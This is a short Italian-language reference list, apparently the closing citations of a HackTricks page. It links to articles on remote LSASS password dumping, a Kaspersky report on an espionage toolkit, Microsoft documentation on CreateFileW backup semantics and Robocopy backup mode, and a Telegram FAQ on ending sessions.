- [9] [en.hackndo.com - Dump remoto delle password di LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho amplia il proprio arsenale di cyber-spionaggio con il toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funzione CreateFileW e `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – modalità backup `/B` di Robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ di Telegram – terminazione delle sessioni attive](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
